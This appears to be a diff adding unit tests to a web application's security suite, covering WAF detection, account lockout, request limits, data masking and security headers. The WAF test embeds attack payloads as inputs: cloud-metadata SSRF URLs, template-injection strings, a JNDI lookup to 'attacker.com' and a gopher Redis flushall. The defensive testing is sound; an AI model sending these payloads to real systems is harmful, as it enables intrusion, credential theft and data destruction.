@@ -28,6 +28,10 @@ from web.security.sanitizer import sanitize_input, sanitize_string
 from web.security.audit import AuditLogger
 from web.security.cors import cors_manager, CORSManager
 from web.security.vpn_guard import vpn_guard, VPNNetworkGuard
+from web.security.account_lockout import AccountLockoutManager, account_lockout_manager
+from web.security.request_guard import RequestGuard, request_guard
+from web.security.data_masker import mask_sensitive_data, is_sensitive_key
+from web.security.headers import DEFAULT_SECURITY_HEADERS
 
 class TestWebSecuritySuite(unittest.TestCase):
 
@@ -248,5 +252,118 @@ class TestWebSecuritySuite(unittest.TestCase):
         self.assertTrue(allowed)
         self.assertIsNone(err)
 
+    def test_14_advanced_waf_ssrf_ssti_jndi_and_wrappers(self):
+        waf = WAFEngine()
+
+        # 1. SSRF
+        is_safe, rule, _ = waf.inspect_request("/api/v1/proxy?url=http://169.254.169.254/latest/meta-data/", {})
+        self.assertFalse(is_safe)
+        self.assertEqual(rule, "SSRF_ATTACK")
+
+        is_safe, rule, _ = waf.inspect_request("/api/v1/webhook", {}, body='{"target": "http://metadata.google.internal/computeMetadata/v1/"}', method="POST")
+        self.assertFalse(is_safe)
+        self.assertEqual(rule, "SSRF_ATTACK")
+
+        # 2. SSTI
+        is_safe, rule, _ = waf.inspect_request("/search?q={{7*7}}", {})
+        self.assertFalse(is_safe)
+        self.assertEqual(rule, "SSTI_ATTACK")
+
+        is_safe, rule, _ = waf.inspect_request("/api/v1/profile", {}, body='{"bio": "{{config.items()}}"}', method="POST")
+        self.assertFalse(is_safe)
+        self.assertEqual(rule, "SSTI_ATTACK")
+
+        # 3. JNDI / Log4j
+        is_safe, rule, _ = waf.inspect_request("/api/v1/log", {"User-Agent": "${jndi:ldap://attacker.com/exp}"})
+        self.assertFalse(is_safe)
+        self.assertEqual(rule, "JNDI_LOG4J_ATTACK")
+
+        # 4. Protocol Wrappers
+        is_safe, rule, _ = waf.inspect_request("/api/v1/fetch?file=php://filter/resource=index.php", {})
+        self.assertFalse(is_safe)
+        self.assertEqual(rule, "PROTOCOL_WRAPPER_ATTACK")
+
+        is_safe, rule, _ = waf.inspect_request("/api/v1/fetch?target=gopher://127.0.0.1:6379/_flushall", {})
+        self.assertFalse(is_safe)
+        self.assertEqual(rule, "PROTOCOL_WRAPPER_ATTACK")
+
+    def test_15_account_lockout_mechanism(self):
+        mgr = AccountLockoutManager(max_attempts=3, lockout_seconds=60)
+        user = "admin_test"
+
+        # Ban đầu không bị khóa
+        is_l, _ = mgr.is_locked(user)
+        self.assertFalse(is_l)
+
+        # 2 lần thất bại -> vẫn chưa khóa
+        mgr.record_failure(user)
+        is_l, _ = mgr.is_locked(user)
+        self.assertFalse(is_l)
+
+        mgr.record_failure(user)
+        is_l, _ = mgr.is_locked(user)
+        self.assertFalse(is_l)
+
+        # Lần thứ 3 -> bị khóa
+        just_locked, remaining_or_sec = mgr.record_failure(user)
+        self.assertTrue(just_locked)
+        is_l, remaining = mgr.is_locked(user)
+        self.assertTrue(is_l)
+        self.assertTrue(remaining > 0)
+
+        # Đăng nhập thành công sau khi mở khóa -> xóa lịch sử
+        mgr.record_success(user)
+        is_l, _ = mgr.is_locked(user)
+        self.assertFalse(is_l)
+
+    def test_16_request_guard_limits_and_mime(self):
+        guard = RequestGuard(max_body_size=1024)
+
+        # 1. Payload kích thước bình thường
+        valid, code, _ = guard.validate_request("POST", "/api/v1/devices", {"Content-Length": "500", "Content-Type": "application/json"})
+        self.assertTrue(valid)
+        self.assertEqual(code, 200)
+
+        # 2. Payload vượt quá giới hạn (413 Payload Too Large)
+        valid, code, msg = guard.validate_request("POST", "/api/v1/devices", {"Content-Length": "2048", "Content-Type": "application/json"})
+        self.assertFalse(valid)
+        self.assertEqual(code, 413)
+
+        # 3. Content-Type không hợp lệ (415 Unsupported Media Type)
+        valid, code, msg = guard.validate_request("POST", "/api/v1/devices", {"Content-Length": "100", "Content-Type": "application/xml"})
+        self.assertFalse(valid)
+        self.assertEqual(code, 415)
+
+    def test_17_data_masker(self):
+        raw_payload = {
+            "id": 101,
+            "username": "network_admin",
+            "password": "ClearTextPassword123!",
+            "api_key": "sec_live_998877665544332211",
+            "device": {
+                "ip": "192.168.1.100",
+                "router_secret": "RouterSecretKey999"
+            }
+        }
+        masked = mask_sensitive_data(raw_payload)
+
+        # Dữ liệu thường giữ nguyên
+        self.assertEqual(masked["id"], 101)
+        self.assertEqual(masked["username"], "network_admin")
+        self.assertEqual(masked["device"]["ip"], "192.168.1.100")
+
+        # Dữ liệu nhạy cảm được che dấu bằng ********
+        self.assertEqual(masked["password"], "********")
+        self.assertEqual(masked["api_key"], "********")
+        self.assertEqual(masked["device"]["router_secret"], "********")
+
+    def test_18_enhanced_security_headers(self):
+        self.assertIn("Permissions-Policy", DEFAULT_SECURITY_HEADERS)
+        self.assertIn("Cross-Origin-Opener-Policy", DEFAULT_SECURITY_HEADERS)
+        self.assertIn("Cross-Origin-Resource-Policy", DEFAULT_SECURITY_HEADERS)
+        self.assertIn("Cross-Origin-Embedder-Policy", DEFAULT_SECURITY_HEADERS)
+        self.assertIn("X-Permitted-Cross-Domain-Policies", DEFAULT_SECURITY_HEADERS)
+
 if __name__ == "__main__":
     unittest.main()
+
